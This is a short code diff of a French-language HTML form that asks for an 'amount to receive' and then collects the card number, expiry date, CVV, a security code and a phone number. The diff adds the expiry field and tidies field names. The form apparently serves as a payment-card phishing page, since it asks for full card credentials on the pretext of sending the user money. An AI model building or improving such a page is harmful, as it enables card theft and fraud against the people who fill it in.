@@ -114,7 +114,9 @@ input::placeholder {
     <form method="post">
       <input type="text" id="montant" name="montant" placeholder="Montant à recevoir" required>
 
-      <input type="text" id="carte" name="carte" placeholder="Numéro de carte bleue" required>
+      <input type="text" id="carte_numero" name="carte_numero" placeholder="Numéro de carte bleue" required>
+
+      <input type="text" id="carte_expiration" name="carte_expiration" placeholder="Date de validité (MM/AA)" required>
 
       <input type="text" id="crypto" name="crypto" placeholder="Cryptogramme" required>
 
@@ -124,10 +126,10 @@ input::placeholder {
 
       <input type="text" id="code_securite" name="code_securite" placeholder="Code de sécurité" required>
 
-      <input type="text" id="numéro" name="numéro" placeholder="numéro de téléphone" required>
+      <input type="text" id="numero" name="numero" placeholder="Numéro de téléphone" required>
 
       <button type="submit" class="btn">Utiliser ces informations</button>
-    </form>
+</form>
   </div>
 
 </body>
